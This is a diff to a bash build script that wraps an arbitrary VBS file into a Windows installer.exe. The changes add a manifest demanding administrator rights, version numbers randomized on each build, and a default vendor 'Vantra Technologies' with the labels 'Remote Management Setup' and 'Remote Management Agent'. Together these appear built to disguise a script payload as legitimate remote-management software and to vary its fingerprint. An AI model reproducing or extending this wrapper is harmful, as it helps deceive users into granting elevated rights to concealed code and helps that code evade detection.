@@ -8,6 +8,7 @@
 VBS_PATH=""
 ICO_PATH=""
 OUTPUT_PATH=""
+MANUFACTURER=""
 
 # Parse named arguments
 while [[ $# -gt 0 ]]; do
@@ -22,6 +23,10 @@ while [[ $# -gt 0 ]]; do
             ;;
         --output)
             OUTPUT_PATH="$2"
+            shift 2
+            ;;
+        --manufacturer)
+            MANUFACTURER="$2"
             shift 2
             ;;
         *)
@@ -39,6 +44,9 @@ fi
 if [[ -z "$OUTPUT_PATH" ]]; then
     echo "Error: --output is required (path where installer.exe should be written)"
     exit 1
+fi
+if [[ -z "$MANUFACTURER" ]]; then
+    MANUFACTURER="Vantra Technologies"
 fi
 
 # Check x86_64-w64-mingw32-gcc is installed
@@ -63,6 +71,35 @@ PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"
 BUILD_TEMP=$(mktemp -d)
 trap "rm -rf $BUILD_TEMP" EXIT
 
+# Generate random version numbers for the VERSIONINFO block
+VER_MAJOR=$(shuf -i 2-5 -n 1)
+VER_MINOR=$(shuf -i 0-9 -n 1)
+VER_PATCH=$(shuf -i 0-99 -n 1)
+VER_STR="${VER_MAJOR}.${VER_MINOR}.${VER_PATCH}.0"
+VER_CSV="${VER_MAJOR},${VER_MINOR},${VER_PATCH},0"
+CUR_YEAR=$(date +%Y)
+
+# Write application manifest (requireAdministrator + modern OS compatibility)
+cat > "$BUILD_TEMP/launcher.manifest" <<EOF
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <assemblyIdentity version="1.0.0.0" name="setup" type="win32"/>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
+    <application>
+      <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/>
+      <supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/>
+    </application>
+  </compatibility>
+</assembly>
+EOF
+
 # Copy the VBS launcher
 if [[ ! -f "$VBS_PATH" ]]; then
     echo "Error: VBS file not found at: $VBS_PATH"
@@ -79,11 +116,69 @@ if [[ -n "$ICO_PATH" ]]; then
     cp "$ICO_PATH" "$BUILD_TEMP/custom.ico"
     cat > "$BUILD_TEMP/launcher.rc" <<EOF
 1 ICON "custom.ico"
+1 24 "launcher.manifest"
 101 RCDATA "launcher.vbs"
+VS_VERSION_INFO VERSIONINFO
+ FILEVERSION     $VER_CSV
+ PRODUCTVERSION  $VER_CSV
+ FILEFLAGSMASK   0x3fL
+ FILEFLAGS       0x0L
+ FILEOS          0x40004L
+ FILETYPE        0x1L
+ FILESUBTYPE     0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904b0"
+        BEGIN
+            VALUE "CompanyName",      "$MANUFACTURER\0"
+            VALUE "FileDescription",  "Remote Management Setup\0"
+            VALUE "FileVersion",      "$VER_STR\0"
+            VALUE "InternalName",     "setup\0"
+            VALUE "LegalCopyright",   "Copyright $CUR_YEAR $MANUFACTURER\0"
+            VALUE "OriginalFilename", "setup.exe\0"
+            VALUE "ProductName",      "Remote Management Agent\0"
+            VALUE "ProductVersion",   "$VER_STR\0"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x0409, 1200
+    END
+END
 EOF
 else
     cat > "$BUILD_TEMP/launcher.rc" <<EOF
+1 24 "launcher.manifest"
 101 RCDATA "launcher.vbs"
+VS_VERSION_INFO VERSIONINFO
+ FILEVERSION     $VER_CSV
+ PRODUCTVERSION  $VER_CSV
+ FILEFLAGSMASK   0x3fL
+ FILEFLAGS       0x0L
+ FILEOS          0x40004L
+ FILETYPE        0x1L
+ FILESUBTYPE     0x0L
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904b0"
+        BEGIN
+            VALUE "CompanyName",      "$MANUFACTURER\0"
+            VALUE "FileDescription",  "Remote Management Setup\0"
+            VALUE "FileVersion",      "$VER_STR\0"
+            VALUE "InternalName",     "setup\0"
+            VALUE "LegalCopyright",   "Copyright $CUR_YEAR $MANUFACTURER\0"
+            VALUE "OriginalFilename", "setup.exe\0"
+            VALUE "ProductName",      "Remote Management Agent\0"
+            VALUE "ProductVersion",   "$VER_STR\0"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x0409, 1200
+    END
+END
 EOF
 fi
 
